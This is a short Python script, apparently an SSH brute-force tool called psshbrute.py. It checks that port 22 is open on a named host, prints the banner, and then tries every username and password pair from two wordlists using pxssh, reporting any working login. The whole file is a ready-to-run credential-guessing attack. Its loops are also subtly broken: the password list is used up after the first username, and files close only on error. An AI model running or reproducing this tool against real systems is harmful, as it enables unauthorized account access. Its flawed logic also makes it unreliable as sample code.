#!/usr/bin/python
import socket
import sys
import os
from pexpect import pxssh
found = 1 #global variable to check the if connection is made
con =False 
def usg():
	print("[+]USAGE: psshbrute.py hostname userfile passwordfile\n")
	exit()
def files(target,user_file,pass_file):
	user=user_file
	passw=pass_file

	try:
		print("*********** [+] Bruteforcer Running********** ")
		u=open(user,'r')
		p=open(passw,'r')
		for uline in u.readlines():
			for pline in p.readlines():
				print("[?] Trying:"+uline+":"+pline)
				res=brute(target,uline,pline)
				
				if(found==0):
					print("[+] User and Password Found:\n"+"username:"+uline+"password:"+pline)
					break
			
				
	except Exception as f:
		print(f)	
		u.close()
		p.close()
def brute(target,user,passwd):
	global found
	try:			
		s=pxssh.pxssh()
		s.login(target,user,passwd)
		found=0
		return found
	except Exception as e:
		print(e)
		
	
def scan():
	try:
		target=sys.argv[1]
		sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		ip=socket.gethostbyname(target)
		r=sock.connect_ex((ip,22))
		if(r==0):

			print("TARGET IP: "+ip)
			print("[+] PORT 22 is open")
			bann=sock.recv(1024)
			detailbann=bann.decode('utf-8').strip()
			print("[+] TARGET BANNER: "+detailbann)
			
			
		else:
			print("[-] "+target+" PORT is Closed")
			exit()
	except Exception as e:
		if(con==False):
			print(e)
		

def check():

	if len(sys.argv) < 4:
		print("[-] Not Enough arguments.\n")
		usg()
	else:
		target=sys.argv[1]
		user_file=sys.argv[2]
		pass_file=sys.argv[3]
		scan()
		files(target,user_file,pass_file)


check()
